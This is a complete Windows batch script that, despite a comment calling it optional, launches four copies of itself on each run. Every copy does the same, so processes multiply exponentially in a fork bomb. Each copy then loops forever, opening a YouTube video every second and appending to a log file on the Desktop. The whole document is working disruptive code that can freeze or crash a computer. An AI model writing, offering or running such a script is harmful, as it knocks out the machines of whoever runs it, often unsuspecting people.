@echo off
setlocal enabledelayedexpansion

:: Set Desktop path
set "desktop=%USERPROFILE%\Desktop"
set "logfile=%desktop%\log.txt"

:: YouTube URL
set "url=https://www.youtube.com/watch?v=rrk-zuuc77U"

:: Optional: Start multiple instances of this script
start "" "%~f0"
start "" "%~f0"
start "" "%~f0"
start "" "%~f0"

:: Infinite loop
:loop
    :: Open the URL in a background command window
    start "" cmd /c start /b "" "!url!"

    :: Append timestamped log to the text file on the desktop
    echo [%date% %time%] URL opened >> "!logfile!"

    :: Wait 1 second before next loop
    timeout /t 1 /nobreak >nul

    goto loop
